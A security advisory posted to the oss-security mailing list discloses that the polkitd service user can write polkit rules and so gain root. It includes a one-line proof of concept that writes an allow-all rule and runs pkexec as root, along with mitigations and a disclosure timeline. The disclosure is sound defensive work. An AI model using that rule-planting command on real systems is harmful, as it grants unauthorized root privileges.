Received: (qmail 17629 invoked by uid 550); 29 Mar 2023 14:06:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3441 invoked from network); 29 Mar 2023 13:35:03 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1680096891; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=1pzCBeKDr52BZJjgDE3vrGmuJZcR1v+9YXVI1emEiR8=;
	b=te4KrvTxgsnHyCUleVsxbhK4lFW+DojwHLLn1m5VGd9DLJDz9DxjIslndfMX1U/RcVnQBx
	kfX6WSOfVwANSXUnUq8+x/xfGzguvAA20/BNsarxqcmEmI4T/R9Xm6GgAKFZgcc6avGyd/
	tFJWYcrzdUoaBhjvLnptkZnN+ZRZeng=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1680096891;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=1pzCBeKDr52BZJjgDE3vrGmuJZcR1v+9YXVI1emEiR8=;
	b=ZGy/PiPsi1LYYmzZ8L3BDSu0ZqJ4XTd6ZumUDl8yP1UnedX3MTTz9UuBQFj98oqcFeYSzA
	22HbmvC7yLrNtyCw==
Date: Wed, 29 Mar 2023 15:34:50 +0200
From: Johannes Segitz <jsegitz@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <20230329133450.GK21675@suse.com>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="2DT8m24oj8Onh3Jp"
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
Subject: [oss-security] polkitd service user privilege separation

--2DT8m24oj8Onh3Jp
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello,

I'm a member of the SUSE product security team. During the product audit
for SLES 15 SP5 I noticed an issue with polkit:

# Default rules config writeable for the service user

polkit stores rules in /etc/polkit-1/rules.d. We follow the upstream
provided permissions for this folder, so polkitd owns it and permissions
are set to 700:

localhost:/etc/polkit-1/rules.d # ls -lah
total 64K
drwx------ 1 polkitd root  44 Mar  8 18:29 .
drwxr-xr-x 1 root    root  14 Mar  8 17:16 ..
-rw-r--r-- 1 root    root 64K Mar  8 17:18 90-default-privs.rules

Since the user owns the directory it's easy to escalate from user polkitd
to root. The user can create own rules that are interpreted by the polkit
authority which in turn grants root privileges via e.g. the setuid-root
binary pkexec.

# POC

To show the impact of this get access to a shell running as polkitd. The
easiest way is to spawn a root shell, then change into the polkitd user:

root $ sudo -u polkitd /bin/sh
polkitd $ id
uid=3D475(polkitd) gid=3D475(polkitd) groups=3D475(polkitd)
polkitd $ pkexec id
=3D=3D=3D=3D AUTHENTICATING FOR org.freedesktop.policykit.exec =3D=3D=3D=3D
Authentication is needed to run `/usr/bin/id' as the super user
Authenticating as: root
Password:

So with the default rules the root password would be required. Since the
rules directory is writeable we can add a rule that allows everything:

polkitd $ echo 'polkit.addRule(function(action, subject) { return "yes"; })=
;' > /etc/polkit-1/rules.d/00-allow-all.rules
polkitd $ pkexec id
uid=3D0(root) gid=3D0(root) groups=3D0(root)

This demonstration caused some confusion in the original report to
upstream. The POC is here to demonstrate the issue, not how real world
exploitation would work. A real world exploit would rely on another
vulnerability to be able to act as polkitd and then use the issue outlined
here to escalate privileges.

# Proposed solution

If you can act as the polkitd user you can also likely influence the polkit
daemon and gain root this way, so this just makes it (a lot) easier to expl=
oit.
I still think it's worthwhile to keep the user for the daemon and not run i=
t as
root.

For existing installations change the permissions of
- /etc/polkit-1/rules.d
- /usr/share/polkit-1/rules.d
to root:polkitd, 750 to make it harder to gain root privileges.

SELinux or other more fine-grained control could be used to make escalating
to root harder, by restricting the amount of freedom polkitd has. But in
the end it's probably not possible to fully prevent this.

Currently the documentation raises the expectation that there's a security
boundary (man polkit):
The polkit authority is implemented as an system daemon, polkitd(8), which
itself has little privilege as it is running as the polkitd system user.

Through this posting I wanted to raise awareness that the polkitd user in a
default installation is equivalent to root without any further counter
measures. In my opinion this should be stated in the man pages so that
users are aware of this. At the moment most people would likely assume that
the user serves a similar roles as other service users.

# Communication with upstream

- 2023-03-09: Informed upstream via confidential ticket:
  https://gitlab.freedesktop.org/polkit/polkit/-/issues/191
- 2023-03-15: Proposed documentation fix, not merged
  https://gitlab.freedesktop.org/polkit/polkit/-/issues/191#note_1824052
- 2023-03-21: Partial fix for the permission in
  https://gitlab.freedesktop.org/polkit/polkit/-/merge_requests/153
- 2023-03-29: Issue is public

Johannes
--=20
GPG Key                EE16 6BCE AD56 E034 BFB3  3ADD 7BF7 29D5 E7C8 1FA0
Subkey fingerprint:    250F 43F5 F7CE 6F1E 9C59  4F95 BC27 DD9D 2CC4 FD66
SUSE Software Solutions Germany GmbH, Frankenstra=DFe 146, 90461 N=FCrnberg=
, Germany
Gesch=E4ftsf=FChrer: Ivo Totev, Andrew Myers, Andrew McDonald, Boudien Moer=
man
(HRB 36809, AG N=FCrnberg)

--2DT8m24oj8Onh3Jp
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEJQ9D9ffObx6cWU+VvCfdnSzE/WYFAmQkPnoACgkQvCfdnSzE
/WZdcQ/9GMI8UzFK7bBnWYcEVlQRE1PObYnF41Ql+8uNJW+woVwD6DD+LJ/Bc+EO
fL/neG9s3csEag4mayFQyKjb1Tq48JvDBIJfPnFBeI7lzpoIa3fbLD2X9+MxTOqY
yW9VSs2rgE+iSMbvMJOpVycHoO2PSqHr4c0y6G/+tFGsWFw8LjfAiRd3GzJ38GGC
gCM53yL2We1/aUIMGCJfXYSR9iEWEoduj39O03bohiKPioH+gdkFW69R0L/3V7+4
trHyXsYaTS2sMnbXCDD4/VUzlLZRp2Zq2uV4BQzrGREAESsT7DVSGzVNH9iUZWCw
9is5YHsBxHfY+aLA8oA8po0K4iojVOU0WMWF/XLz6I6RFzlEwFRyAe3Lm9iZePBx
St+AshyMJhhjnP3aJFbxL3/vwt4x236CS9ByAcy9rlQjC0tkeHAaSq5eWeoE4rx6
ouRYyEiZT/rR7shx727dlJmdnn1BzuUnfgjCo3gNS6ogifnV9yvFl7V859eMoHAp
MDSs6KDdUJ2y7tVvUCU9s1JMBlhJ9zxES00yrG/h5IZODN+ye/6nCh11uXxQkaXo
ye5b3FK+0LM3STKugZbG8v4mloeBjXLLPYCjgHAkYpXUF02x8IQnVdPYUuEqx7TW
XhDPecIWjkn/dtrMRh23lvI/da8e7/nGF/A9OVZSvn1IWKy0bSc=
=qkJp
-----END PGP SIGNATURE-----

--2DT8m24oj8Onh3Jp--
